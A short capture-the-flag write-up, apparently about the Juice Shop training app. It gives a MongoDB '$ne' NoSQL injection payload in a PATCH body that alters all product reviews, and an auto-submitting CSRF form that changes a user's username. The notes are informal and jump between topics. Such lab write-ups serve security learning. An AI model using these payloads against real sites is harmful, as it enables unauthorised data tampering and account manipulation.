
### NoSQL Manipulation

#### Difficulty: Moderate

NoSQL (non-sql or not only sql) is a query which targets databases that do not use sql.

Change query to PATCH /rest/products/reviews

{
    "message":"sdf",
    "id":{ "$ne":-1
  }
}


NOte that this is using MongoDB


But we need to UPDATE the reviews.

adding a review, then going back and editing it. Catch that request in burp.





Next, lets see if we can change the name of one of the users. 
In the description for this challenge there is a link to a site where we can do some real time HTML editing.

![csrf_link](https://github.com/jjolley91/blog/blob/main/static/broken_Auth/csrf_link.png?raw=true)

```HTML
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

 First let's go to our user profile, and click 'Set Username', and capture the request in Burp.

![profile_page](https://github.com/jjolley91/blog/blob/main/static/broken_Auth/profile_page.png?raw=true)

